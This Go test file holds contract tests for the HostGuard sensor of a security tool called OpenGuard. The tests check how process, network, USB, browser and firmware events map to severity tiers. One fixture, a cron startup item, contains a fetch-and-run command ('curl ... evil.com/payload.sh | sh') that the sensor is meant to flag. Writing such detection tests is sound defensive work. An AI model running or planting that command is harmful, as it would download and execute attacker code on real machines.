// Package contract contains contract tests for OpenGuard v5 HostGuard sensor.
package contract_test

import (
	"encoding/json"
	"strings"
	"testing"
	"time"

	common "github.com/DiniMuhd7/openguard/adapters/hostguard/common"
)

// TestHostEventToUnifiedEvent verifies that HostEvent.ToUnifiedEvent()
// produces a JSON payload with all required UnifiedEvent schema fields.
func TestHostEventToUnifiedEvent(t *testing.T) {
	event := &common.HostEvent{
		EventType: "process_anomaly",
		Platform:  "linux",
		Hostname:  "test-host",
		Timestamp: time.Now(),
		Process: &common.ProcessInfo{
			PID:        1234,
			PPID:       1,
			Name:       "suspicious",
			ExePath:    "/tmp/suspicious",
			CmdLine:    "/tmp/suspicious --evil",
			Username:   "testuser",
			CPUPercent: 95.0,
			MemoryMB:   3000.0,
			Status:     "running",
		},
		Indicators: []string{"suspicious_path", "resource_spike"},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal unified event: %v", err)
	}

	// Verify all required fields are present.
	required := []string{
		"event_id", "timestamp", "source", "domain", "severity",
		"risk_score", "tier", "actor", "target", "human_approved", "audit_hash",
	}
	for _, field := range required {
		if _, ok := result[field]; !ok {
			t.Errorf("missing required field: %s", field)
		}
	}

	// Verify field values.
	if result["domain"] != "host" {
		t.Errorf("expected domain=host, got %v", result["domain"])
	}
	if result["human_approved"] != false {
		t.Errorf("expected human_approved=false, got %v", result["human_approved"])
	}
	if result["audit_hash"] == "" {
		t.Error("expected non-empty audit_hash")
	}
	if result["severity"] != "medium" {
		t.Errorf("expected severity=medium for process_anomaly, got %v", result["severity"])
	}
	if result["tier"] != "T2" {
		t.Errorf("expected tier=T2 for process_anomaly, got %v", result["tier"])
	}

	// Verify source object.
	source, ok := result["source"].(map[string]interface{})
	if !ok {
		t.Fatal("source is not an object")
	}
	if source["type"] != "host" {
		t.Errorf("expected source.type=host, got %v", source["type"])
	}
	if source["adapter"] != "hostguard" {
		t.Errorf("expected source.adapter=hostguard, got %v", source["adapter"])
	}

	// Verify event_id is UUID format.
	eventID, _ := result["event_id"].(string)
	if len(eventID) != 36 || strings.Count(eventID, "-") != 4 {
		t.Errorf("event_id does not look like a UUID: %s", eventID)
	}
}

// TestPublisherInterface verifies that Publisher implements the expected interface
// by checking it has the Publish and Close methods.
func TestPublisherInterface(t *testing.T) {
	// We cannot construct a real Publisher without NATS; we verify the type has the
	// right method signatures by attempting a compile-time assertion via a nil pointer.
	type publisherInterface interface {
		Close()
	}
	var _ publisherInterface = (*common.Publisher)(nil)
}

// TestSuspiciousPathDetection verifies suspicious path indicators are correctly set
// when an event references a known suspicious path.
func TestSuspiciousPathDetection(t *testing.T) {
	event := &common.HostEvent{
		EventType: "process_anomaly",
		Platform:  "linux",
		Hostname:  "test-host",
		Timestamp: time.Now(),
		Process: &common.ProcessInfo{
			PID:     5678,
			Name:    "malware",
			ExePath: "/tmp/malware",
		},
		Indicators: []string{"suspicious_path"},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	indicators, ok := result["indicators"].([]interface{})
	if !ok {
		t.Fatal("indicators is not a list")
	}
	found := false
	for _, ind := range indicators {
		if ind == "suspicious_path" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected 'suspicious_path' in indicators, got %v", indicators)
	}
}

// TestPrivilegeEscalationIndicators verifies privilege escalation indicators
// are preserved in the UnifiedEvent output.
func TestPrivilegeEscalationIndicators(t *testing.T) {
	event := &common.HostEvent{
		EventType: "privilege_escalation",
		Platform:  "linux",
		Hostname:  "test-host",
		Timestamp: time.Now(),
		Process: &common.ProcessInfo{
			PID:  9999,
			Name: "sudo",
		},
		Indicators: []string{"sudo_invocation", "privilege_escalation"},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	// For privilege_escalation event type, we expect high severity.
	if result["severity"] != "high" {
		t.Errorf("expected severity=high for privilege_escalation, got %v", result["severity"])
	}
	if result["tier"] != "T3" {
		t.Errorf("expected tier=T3 for privilege_escalation, got %v", result["tier"])
	}

	indicators, ok := result["indicators"].([]interface{})
	if !ok {
		t.Fatal("indicators is not a list")
	}
	indMap := make(map[string]bool)
	for _, ind := range indicators {
		if s, ok := ind.(string); ok {
			indMap[s] = true
		}
	}
	for _, expected := range []string{"sudo_invocation", "privilege_escalation"} {
		if !indMap[expected] {
			t.Errorf("expected indicator %q not found in %v", expected, indicators)
		}
	}
}

// TestSensorConfigDefaults verifies that DefaultConfig returns sensible defaults.
func TestSensorConfigDefaults(t *testing.T) {
	cfg := common.DefaultConfig()
	if cfg.RawEventTopic != "openguard.hostguard.raw" {
		t.Errorf("expected default topic, got %s", cfg.RawEventTopic)
	}
	if cfg.PollInterval == 0 {
		t.Error("expected non-zero PollInterval")
	}
	if cfg.AnomalyThresholds.CPUPercentHigh != 90.0 {
		t.Errorf("expected CPUPercentHigh=90.0, got %f", cfg.AnomalyThresholds.CPUPercentHigh)
	}
	if cfg.AnomalyThresholds.MemoryMBHigh != 2048.0 {
		t.Errorf("expected MemoryMBHigh=2048.0, got %f", cfg.AnomalyThresholds.MemoryMBHigh)
	}
	if cfg.AnomalyThresholds.NewProcessBurst != 20 {
		t.Errorf("expected NewProcessBurst=20, got %d", cfg.AnomalyThresholds.NewProcessBurst)
	}
}

// TestStartupItemUnifiedEvent verifies startup item events produce correct UnifiedEvent fields.
func TestStartupItemUnifiedEvent(t *testing.T) {
	event := &common.HostEvent{
		EventType: "startup_item_added",
		Platform:  "linux",
		Hostname:  "test-host",
		Timestamp: time.Now(),
		StartupItem: &common.StartupItem{
			ID:      "test-cron-1",
			Name:    "backdoor",
			Type:    "cron",
			Command: "curl http://evil.com/payload.sh | sh",
			Source:  "/etc/cron.d/backdoor",
			Enabled: true,
		},
		Indicators: []string{"curl_pipe_sh"},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	if result["severity"] != "high" {
		t.Errorf("expected severity=high for startup_item_added, got %v", result["severity"])
	}
	if result["tier"] != "T2" {
		t.Errorf("expected tier=T2 for startup_item_added, got %v", result["tier"])
	}
}

// TestNetworkConnectionToUnifiedEvent verifies NetworkConnection events
// produce valid UnifiedEvent JSON with all required fields.
func TestNetworkConnectionToUnifiedEvent(t *testing.T) {
event := &common.HostEvent{
EventType: "connection_established",
Platform:  "linux",
Hostname:  "test-host",
Timestamp: time.Now(),
Process: &common.ProcessInfo{
PID:  1234,
Name: "curl",
},
Indicators: []string{},
RawData: map[string]interface{}{
"protocol":    "tcp",
"local_addr":  "192.168.1.5",
"local_port":  uint16(54321),
"remote_addr": "1.2.3.4",
"remote_port": uint16(80),
"state":       "ESTABLISHED",
"direction":   "outbound",
},
}

payload, err := event.ToUnifiedEvent()
if err != nil {
t.Fatalf("ToUnifiedEvent failed: %v", err)
}

var result map[string]interface{}
if err := json.Unmarshal(payload, &result); err != nil {
t.Fatalf("unmarshal unified event: %v", err)
}

required := []string{
"event_id", "timestamp", "source", "domain", "severity",
"risk_score", "tier", "actor", "target", "human_approved", "audit_hash",
}
for _, field := range required {
if _, ok := result[field]; !ok {
t.Errorf("missing required field: %s", field)
}
}

if result["domain"] != "host" {
t.Errorf("expected domain=host, got %v", result["domain"])
}
// connection_established maps to info/T0.
if result["tier"] != "T0" {
t.Errorf("expected tier=T0 for connection_established, got %v", result["tier"])
}
}

// TestSuspiciousPortDetection verifies IsSuspiciousPort helper correctly
// identifies known C2 ports.
func TestSuspiciousPortDetection(t *testing.T) {
// Verify all ports in the suspicious list are detected.
for _, port := range common.SuspiciousRemotePorts {
if !common.IsSuspiciousPort(port) {
t.Errorf("expected port %d to be flagged as suspicious", port)
}
}

normalPorts := []uint16{80, 443, 22, 25, 53, 8080}
for _, port := range normalPorts {
if common.IsSuspiciousPort(port) {
t.Errorf("expected port %d NOT to be flagged as suspicious", port)
}
}
}

// TestPrivateRangeDetection verifies IsPrivateRange correctly identifies
// RFC1918 addresses.
func TestPrivateRangeDetection(t *testing.T) {
privateAddrs := []string{
"10.0.0.1", "10.255.255.255",
"172.16.0.1", "172.31.255.255",
"192.168.0.1", "192.168.255.255",
"127.0.0.1",
}
for _, addr := range privateAddrs {
if !common.IsPrivateRange(addr) {
t.Errorf("expected %s to be in private range", addr)
}
}

publicAddrs := []string{"8.8.8.8", "1.1.1.1", "203.0.113.1"}
for _, addr := range publicAddrs {
if common.IsPrivateRange(addr) {
t.Errorf("expected %s NOT to be in private range", addr)
}
}
}

// TestServiceInfoIndicators verifies Windows service anomaly indicators
// are correctly set for suspicious service configurations.
func TestServiceInfoIndicators(t *testing.T) {
// Verify suspicious_connection event type gets correct severity.
event := &common.HostEvent{
EventType: "suspicious_connection",
Platform:  "windows",
Hostname:  "test-host",
Timestamp: time.Now(),
Process: &common.ProcessInfo{
PID:  5678,
Name: "malware.exe",
},
Indicators: []string{"suspicious_remote_port", "known_malicious_process_network"},
}

payload, err := event.ToUnifiedEvent()
if err != nil {
t.Fatalf("ToUnifiedEvent failed: %v", err)
}

var result map[string]interface{}
if err := json.Unmarshal(payload, &result); err != nil {
t.Fatalf("unmarshal: %v", err)
}

if result["severity"] != "high" {
t.Errorf("expected severity=high for suspicious_connection, got %v", result["severity"])
}
if result["tier"] != "T2" {
t.Errorf("expected tier=T2 for suspicious_connection, got %v", result["tier"])
}

indicators, ok := result["indicators"].([]interface{})
if !ok {
t.Fatal("indicators is not a list")
}
indMap := make(map[string]bool)
for _, ind := range indicators {
if s, ok := ind.(string); ok {
indMap[s] = true
}
}
if !indMap["suspicious_remote_port"] {
t.Error("expected 'suspicious_remote_port' indicator")
}
if !indMap["known_malicious_process_network"] {
t.Error("expected 'known_malicious_process_network' indicator")
}
}

// TestCriticalServiceStopped verifies that stopping a critical service
// emits a T3 event with the correct indicator.
func TestCriticalServiceStopped(t *testing.T) {
event := &common.HostEvent{
EventType: "process_anomaly",
Platform:  "windows",
Hostname:  "test-host",
Timestamp: time.Now(),
Process: &common.ProcessInfo{
PID:  4,
Name: "lsass",
},
Indicators: []string{"critical_service_stopped"},
}

payload, err := event.ToUnifiedEvent()
if err != nil {
t.Fatalf("ToUnifiedEvent failed: %v", err)
}

var result map[string]interface{}
if err := json.Unmarshal(payload, &result); err != nil {
t.Fatalf("unmarshal: %v", err)
}

if result["severity"] != "critical" {
t.Errorf("expected severity=critical for critical_service_stopped, got %v", result["severity"])
}
if result["tier"] != "T3" {
t.Errorf("expected tier=T3 for critical_service_stopped, got %v", result["tier"])
}

indicators, ok := result["indicators"].([]interface{})
if !ok {
t.Fatal("indicators is not a list")
}
found := false
for _, ind := range indicators {
if s, ok := ind.(string); ok && s == "critical_service_stopped" {
found = true
break
}
}
if !found {
t.Error("expected 'critical_service_stopped' in indicators")
}
}

// TestIsLoopback verifies IsLoopback helper correctly identifies loopback addresses.
func TestIsLoopback(t *testing.T) {
loopbacks := []string{"127.0.0.1", "::1", "127.0.0.2"}
for _, addr := range loopbacks {
if !common.IsLoopback(addr) {
t.Errorf("expected %s to be loopback", addr)
}
}

nonLoopbacks := []string{"192.168.1.1", "8.8.8.8", "10.0.0.1"}
for _, addr := range nonLoopbacks {
if common.IsLoopback(addr) {
t.Errorf("expected %s NOT to be loopback", addr)
}
}
}

// TestIPv6PrivateRangeDetection verifies IsPrivateRange correctly identifies
// IPv6 private and link-local addresses.
func TestIPv6PrivateRangeDetection(t *testing.T) {
	privateIPv6Addrs := []string{
		"::1",          // loopback
		"fc00::1",      // ULA (fc00::/7)
		"fd00::1",      // ULA (fd00::/8, inside fc00::/7)
		"fe80::1",      // link-local (fe80::/10)
		"fe80::dead:beef", // link-local
	}
	for _, addr := range privateIPv6Addrs {
		if !common.IsPrivateRange(addr) {
			t.Errorf("expected IPv6 %s to be in private range", addr)
		}
	}

	publicIPv6Addrs := []string{
		"2001:db8::1",    // documentation prefix (not private)
		"2606:4700::1",   // Cloudflare
		"2001:4860:4860::8888", // Google DNS
	}
	for _, addr := range publicIPv6Addrs {
		if common.IsPrivateRange(addr) {
			t.Errorf("expected IPv6 %s NOT to be in private range", addr)
		}
	}
}

// TestIPv6NetworkConnectionToUnifiedEvent verifies IPv6 network connection events
// produce valid UnifiedEvent JSON.
func TestIPv6NetworkConnectionToUnifiedEvent(t *testing.T) {
	event := &common.HostEvent{
		EventType: "connection_established",
		Platform:  "linux",
		Hostname:  "test-host",
		Timestamp: time.Now(),
		Process: &common.ProcessInfo{
			PID:  2345,
			Name: "curl",
		},
		Indicators: []string{},
		RawData: map[string]interface{}{
			"protocol":    "tcp6",
			"local_addr":  "::1",
			"local_port":  uint16(54321),
			"remote_addr": "2001:db8::1",
			"remote_port": uint16(443),
			"state":       "ESTABLISHED",
			"direction":   "outbound",
		},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal unified event: %v", err)
	}

	required := []string{
		"event_id", "timestamp", "source", "domain", "severity",
		"risk_score", "tier", "actor", "target", "human_approved", "audit_hash",
	}
	for _, field := range required {
		if _, ok := result[field]; !ok {
			t.Errorf("missing required field: %s", field)
		}
	}

	metadata, ok := result["metadata"].(map[string]interface{})
	if !ok {
		t.Fatal("metadata is not an object")
	}
	if metadata["protocol"] != "tcp6" {
		t.Errorf("expected protocol=tcp6, got %v", metadata["protocol"])
	}
}

// TestUSBDeviceInsertedEvent verifies usb_device_inserted produces severity="medium", tier="T1".
func TestUSBDeviceInsertedEvent(t *testing.T) {
	event := &common.HostEvent{
		EventType: "usb_device_inserted",
		Platform:  "linux",
		Hostname:  "test-host",
		Timestamp: time.Now(),
		RawData: map[string]interface{}{
			"vendor_id":    "0x1234",
			"product_id":   "0x5678",
			"manufacturer": "Test Corp",
			"product_name": "USB Widget",
			"device_class": "00",
			"device_path":  "/sys/bus/usb/devices/1-1",
		},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	if result["severity"] != "medium" {
		t.Errorf("expected severity=medium for usb_device_inserted, got %v", result["severity"])
	}
	if result["tier"] != "T1" {
		t.Errorf("expected tier=T1 for usb_device_inserted, got %v", result["tier"])
	}
}

// TestUSBMassStorageEvent verifies usb_mass_storage_inserted produces severity="high", tier="T2".
func TestUSBMassStorageEvent(t *testing.T) {
	event := &common.HostEvent{
		EventType:  "usb_mass_storage_inserted",
		Platform:   "linux",
		Hostname:   "test-host",
		Timestamp:  time.Now(),
		Indicators: []string{"usb_mass_storage_inserted"},
		RawData: map[string]interface{}{
			"vendor_id":    "0xabcd",
			"product_id":   "0xef01",
			"manufacturer": "StoreCo",
			"product_name": "USB Flash Drive",
			"device_class": "08",
			"device_path":  "/sys/bus/usb/devices/1-2",
		},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	if result["severity"] != "high" {
		t.Errorf("expected severity=high for usb_mass_storage_inserted, got %v", result["severity"])
	}
	if result["tier"] != "T2" {
		t.Errorf("expected tier=T2 for usb_mass_storage_inserted, got %v", result["tier"])
	}
}

// TestCloudMetadataAbuseEvent verifies suspicious_cloud_metadata_access with
// indicator "imds_abuse" produces severity="critical", tier="immediate".
func TestCloudMetadataAbuseEvent(t *testing.T) {
	event := &common.HostEvent{
		EventType:  "suspicious_cloud_metadata_access",
		Platform:   "linux",
		Hostname:   "test-host",
		Timestamp:  time.Now(),
		Indicators: []string{"imds_abuse"},
		Process: &common.ProcessInfo{
			PID:  1234,
			Name: "evil-script",
		},
		RawData: map[string]interface{}{
			"pid":          uint32(1234),
			"process_name": "evil-script",
			"destination":  "169.254.169.254:80",
		},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	if result["severity"] != "critical" {
		t.Errorf("expected severity=critical, got %v", result["severity"])
	}
	if result["tier"] != "immediate" {
		t.Errorf("expected tier=immediate, got %v", result["tier"])
	}
}

// TestLowSlowAnomalyEvent verifies low_and_slow_anomaly produces severity="medium", tier="T2".
func TestLowSlowAnomalyEvent(t *testing.T) {
	event := &common.HostEvent{
		EventType:  "low_and_slow_anomaly",
		Platform:   "linux",
		Hostname:   "test-host",
		Timestamp:  time.Now(),
		Indicators: []string{"low_and_slow_cpu"},
		Process: &common.ProcessInfo{
			PID:        5678,
			Name:       "cryptominer",
			CPUPercent: 12.5,
		},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	if result["severity"] != "medium" {
		t.Errorf("expected severity=medium for low_and_slow_anomaly, got %v", result["severity"])
	}
	if result["tier"] != "T2" {
		t.Errorf("expected tier=T2 for low_and_slow_anomaly, got %v", result["tier"])
	}
}

// TestFirmwareSetupModeEvent verifies firmware_setup_mode produces severity="critical", tier="immediate".
func TestFirmwareSetupModeEvent(t *testing.T) {
	event := &common.HostEvent{
		EventType:  "firmware_setup_mode",
		Platform:   "linux",
		Hostname:   "test-host",
		Timestamp:  time.Now(),
		Indicators: []string{"firmware_setup_mode"},
		RawData: map[string]interface{}{
			"setup_mode": true,
		},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	if result["severity"] != "critical" {
		t.Errorf("expected severity=critical for firmware_setup_mode, got %v", result["severity"])
	}
	if result["tier"] != "immediate" {
		t.Errorf("expected tier=immediate for firmware_setup_mode, got %v", result["tier"])
	}
}

// TestBrowserAnomalyEvent verifies browser_anomaly produces severity="medium", tier="T2".
func TestBrowserAnomalyEvent(t *testing.T) {
	event := &common.HostEvent{
		EventType:  "browser_anomaly",
		Platform:   "linux",
		Hostname:   "test-host",
		Timestamp:  time.Now(),
		Indicators: []string{"browser_suspicious_path"},
		Process: &common.ProcessInfo{
			PID:     9012,
			Name:    "chrome",
			ExePath: "/tmp/chrome",
		},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	if result["severity"] != "medium" {
		t.Errorf("expected severity=medium for browser_anomaly, got %v", result["severity"])
	}
	if result["tier"] != "T2" {
		t.Errorf("expected tier=T2 for browser_anomaly, got %v", result["tier"])
	}
}

// TestBrowserRemoteDebuggingEvent verifies browser_anomaly with indicator
// "browser_remote_debugging_enabled" produces severity="high", tier="T2".
func TestBrowserRemoteDebuggingEvent(t *testing.T) {
	event := &common.HostEvent{
		EventType:  "browser_anomaly",
		Platform:   "linux",
		Hostname:   "test-host",
		Timestamp:  time.Now(),
		Indicators: []string{"browser_remote_debugging_enabled"},
		Process: &common.ProcessInfo{
			PID:     3456,
			Name:    "chrome",
			ExePath: "/usr/bin/chrome",
			CmdLine: "chrome --remote-debugging-port=9222",
		},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	if result["severity"] != "high" {
		t.Errorf("expected severity=high for browser_anomaly+browser_remote_debugging_enabled, got %v", result["severity"])
	}
	if result["tier"] != "T2" {
		t.Errorf("expected tier=T2, got %v", result["tier"])
	}
}

// TestBrowserActivityAnalyzer verifies BrowserActivityAnalyzer.AnalyzeProcess
// returns the correct indicators for various process configurations.
func TestBrowserActivityAnalyzer(t *testing.T) {
	analyzer := common.NewBrowserActivityAnalyzer()

	// Non-browser process → no indicators.
	nonBrowser := &common.ProcessInfo{
		PID:     1,
		Name:    "bash",
		ExePath: "/bin/bash",
		CmdLine: "bash",
	}
	if indicators := analyzer.AnalyzeProcess(nonBrowser); len(indicators) != 0 {
		t.Errorf("expected no indicators for non-browser, got %v", indicators)
	}

	// Browser with suspicious path.
	suspPath := &common.ProcessInfo{
		PID:     2,
		Name:    "chrome",
		ExePath: "/tmp/chrome",
		CmdLine: "chrome",
	}
	indicators := analyzer.AnalyzeProcess(suspPath)
	if !containsIndicator(indicators, "browser_suspicious_path") {
		t.Errorf("expected browser_suspicious_path for /tmp/chrome, got %v", indicators)
	}

	// Browser with remote debugging port flag.
	debugProc := &common.ProcessInfo{
		PID:     3,
		Name:    "chrome",
		ExePath: "/usr/bin/chrome",
		CmdLine: "chrome --remote-debugging-port=9222",
	}
	indicators = analyzer.AnalyzeProcess(debugProc)
	if !containsIndicator(indicators, "browser_remote_debugging_enabled") {
		t.Errorf("expected browser_remote_debugging_enabled, got %v", indicators)
	}

	// Browser with --disable-web-security flag.
	insecureProc := &common.ProcessInfo{
		PID:     4,
		Name:    "chrome",
		ExePath: "/usr/bin/chrome",
		CmdLine: "chrome --disable-web-security",
	}
	indicators = analyzer.AnalyzeProcess(insecureProc)
	if !containsIndicator(indicators, "browser_security_disabled") {
		t.Errorf("expected browser_security_disabled for --disable-web-security, got %v", indicators)
	}

	// Browser with --allow-running-insecure-content flag.
	insecureProc2 := &common.ProcessInfo{
		PID:     5,
		Name:    "firefox",
		ExePath: "/usr/bin/firefox",
		CmdLine: "firefox --allow-running-insecure-content",
	}
	indicators = analyzer.AnalyzeProcess(insecureProc2)
	if !containsIndicator(indicators, "browser_security_disabled") {
		t.Errorf("expected browser_security_disabled for --allow-running-insecure-content, got %v", indicators)
	}
}

// TestLowSlowDetector verifies LowSlowDetector correctly emits indicators
// after recording appropriate samples.
func TestLowSlowDetector(t *testing.T) {
	detector := common.NewLowSlowDetector(5 * time.Minute)

	pid := uint32(1234)
	now := time.Now()

	// Record CPU samples spanning more than the window (6 minutes back to now).
	// Average CPU = 10% (low-and-slow range 5-20%).
	windowStart := now.Add(-6 * time.Minute)
	step := time.Minute
	for i := 0; i <= 6; i++ {
		detector.RecordCPUSample(pid, 10.0, windowStart.Add(time.Duration(i)*step))
	}

	indicators := detector.Evaluate(pid)
	if !containsIndicator(indicators, "low_and_slow_cpu") {
		t.Errorf("expected low_and_slow_cpu after sustained 10%% CPU, got %v", indicators)
	}

	// Record more than 10 process spawns within the window.
	pid2 := uint32(5678)
	for i := 0; i < 12; i++ {
		detector.RecordProcessSpawn(pid2, now.Add(-time.Duration(i)*10*time.Second))
	}
	indicators2 := detector.Evaluate(pid2)
	if !containsIndicator(indicators2, "process_spawn_burst") {
		t.Errorf("expected process_spawn_burst after >10 spawns, got %v", indicators2)
	}

	// Record more than 100 network connections within the window.
	pid3 := uint32(9012)
	for i := 0; i < 101; i++ {
		detector.RecordNetworkConnection(pid3, now.Add(-time.Duration(i)*time.Second))
	}
	indicators3 := detector.Evaluate(pid3)
	if !containsIndicator(indicators3, "network_connection_burst") {
		t.Errorf("expected network_connection_burst after >100 connections, got %v", indicators3)
	}
}

// TestSecureBootDisabledIndicator verifies that the "secure_boot_disabled" indicator
// in a HostEvent maps to severity="high", tier="T2".
func TestSecureBootDisabledIndicator(t *testing.T) {
	event := &common.HostEvent{
		EventType:  "secure_boot_status",
		Platform:   "linux",
		Hostname:   "test-host",
		Timestamp:  time.Now(),
		Indicators: []string{"secure_boot_disabled"},
		RawData: map[string]interface{}{
			"secure_boot_enabled": false,
		},
	}

	payload, err := event.ToUnifiedEvent()
	if err != nil {
		t.Fatalf("ToUnifiedEvent failed: %v", err)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(payload, &result); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}

	if result["severity"] != "high" {
		t.Errorf("expected severity=high for secure_boot_disabled indicator, got %v", result["severity"])
	}
	if result["tier"] != "T2" {
		t.Errorf("expected tier=T2 for secure_boot_disabled indicator, got %v", result["tier"])
	}
}

// containsIndicator returns true if the given indicator string is in the slice.
func containsIndicator(indicators []string, target string) bool {
	for _, ind := range indicators {
		if ind == target {
			return true
		}
	}
	return false
}
